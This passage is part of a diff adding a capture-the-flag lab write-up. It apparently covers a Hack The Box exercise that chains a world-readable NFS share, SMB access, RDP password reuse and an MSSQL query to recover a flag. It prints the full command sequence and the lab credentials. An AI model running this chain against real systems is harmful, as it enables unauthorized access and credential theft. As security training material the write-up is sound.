+HTB     HTB{...flag_redacted...}
+```
+
+**HTB password recovered ✅**
+
+The `devsacc` table contained stored credentials for internal accounts including the `HTB` user. The final password is the lab flag.
+
+---
+
+## Credential Chain — Full Breakdown
+
+| Stage                         | Credential / Access Gained          | Source                          |
+|-------------------------------|-------------------------------------|---------------------------------|
+| NFS share — world-readable    | `alex : lol123!mD`                  | ticket4238791283782.txt         |
+| SMB devshare as alex          | `sa : 87N1ns@slls83`                | important.txt                   |
+| RDP as Administrator          | `Administrator : 87N1ns@slls83`     | Password reuse from sa          |
+| MSSQL query via SSMS          | `HTB : HTB{...flag_redacted...}`    | devsacc table                   |
+
+---
+
+## Lessons Learned
+
+The most important thing this lab reinforced is that multi-service enumeration requires patience and a specific order. The temptation after seeing RDP on port 3389 is to immediately try default credentials against it — but without going through NFS first, there is nothing to try. Every service in this chain unlocks the next one. Skipping NFS or treating it as low priority because it is less commonly exploited would have killed the entire attack path before it started.
+
+The NFS misconfiguration itself was textbook — a world-readable export containing support ticket archives. In a real internal engagement this kind of finding is extremely common. Helpdesk teams routinely paste credentials into tickets for convenience and nobody audits whether the ticket storage system is accessible from the network. `showmount -e` takes three seconds and can return something exactly like this.
+
+The credential reuse from `sa` to `Administrator` was the step that surprised me most. `sa` is a SQL Server service account — it should have no relationship to the Windows local administrator password. But in smaller environments where one person manages everything, they often set the same password for multiple accounts during initial setup and never change it. Testing any recovered password against every available service before moving on is now a fixed step in my methodology.
+
+The MSSQL query itself was trivial once inside the RDP session — `SELECT * FROM devsacc WHERE name='HTB'` returns the answer in one line. But getting to that point required chaining four separate services without breaking the thread. That chain — NFS → SMB → RDP → MSSQL — is exactly the kind of multi-hop enumeration that CPTS and real engagements are built around.
+
+---
+
+## Full Attack Chain Reference
+
+```
+1.  sudo nmap -A 10.129.202.41
+    → Ports: 111(RPC), 2049(NFS), 139/445(SMB), 3389(RDP)
+    → Host: WINMEDIUM — Windows Server 2019
+
+2.  showmount -e 10.129.202.41
+    → /TechSupport (everyone) — world-readable NFS share
+
+3.  sudo mkdir /mnt/NFS
+    sudo mount -t nfs 10.129.202.41:/TechSupport /mnt/NFS
+
+4.  sudo ls -lA /mnt/NFS/
+    → ticket4238791283782.txt has content — others empty
+
+5.  sudo cat /mnt/NFS/ticket4238791283782.txt
+    → alex : lol123!mD (plaintext in support ticket)
+
+6.  smbclient -L //10.129.202.41 -U alex (password: lol123!mD)
+    → Shares: ADMIN$, C$, devshare, IPC$, Users
+    → devshare is non-standard — highest priority
+
+7.  smbclient //10.129.202.41/devshare -U alex
+    → ls → important.txt
+    → get important.txt → exit
+
+8.  cat important.txt
+    → sa : 87N1ns@slls83
+
+9.  xfreerdp /v:10.129.202.41 /u:Administrator /p:'87N1ns@slls83' /dynamic-resolution
+    → Password reuse confirmed — full desktop as Administrator
+
+10. Open SSMS inside RDP session
+    → Connect to local SQL instance
+    → New Query:
+    SELECT * FROM devsacc WHERE name = 'HTB';
+    → HTB : HTB{...flag_redacted...} ✅
+```
+
+---
+
+## Commands Reference
+
+| Command | Purpose |
+|---------|---------|
+| `sudo nmap -A <IP>` | Aggressive scan — OS, version, scripts, traceroute |
+| `showmount -e <IP>` | List all NFS exports on the target |
+| `sudo mkdir /mnt/NFS` | Create local mount point |
+| `sudo mount -t nfs <IP>:/TechSupport /mnt/NFS` | Mount NFS share locally |
+| `sudo ls -lA /mnt/NFS/` | List all files including hidden, with permissions |
+| `sudo cat /mnt/NFS/<file>` | Read file from mounted NFS share |
+| `smbclient -L //<IP> -U <user>` | List all SMB shares with credentials |
+| `smbclient //<IP>/<share> -U <user>` | Connect to specific SMB share |
+| `smb: \> ls` | List files inside connected SMB share |
+| `smb: \> get <file>` | Download file from SMB share |
+| `cat important.txt` | Read downloaded file locally |
+| `xfreerdp /v:<IP> /u:<user> /p:'<pass>' /dynamic-resolution` | RDP login from Linux |
+| `SELECT * FROM devsacc WHERE name='HTB';` | MSSQL query to recover target credential |
